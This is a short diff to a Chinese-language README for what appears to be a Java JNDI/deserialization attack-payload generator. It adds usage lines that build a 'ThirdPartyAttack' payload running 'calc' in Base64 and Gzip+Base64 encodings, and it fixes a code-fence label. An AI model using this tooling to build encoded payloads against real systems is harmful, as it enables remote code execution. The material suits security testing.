@@ -3015,9 +3015,21 @@ rmi://127.0.0.1:1234/Basic
 
 工具：使用encode参数，后面跟着Base64，Hex，BCEL，JS-JavaCode，SPEL-JSCode-JavaCode，Groovy-JavaCode-UtilBase64，Groovy-JavaCode-MiscBase64，Groovy-JSCode-JavaCode
 
+#####  Base64编码
+
+```bash
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Base64"
+```
+
+#####  Gzip+Base64编码
+
+```bash
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "Gzip+Base64"
+```
+
 #####  BCEL 编码
 
-```python
+```bash
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "BCEL"
 ```
 
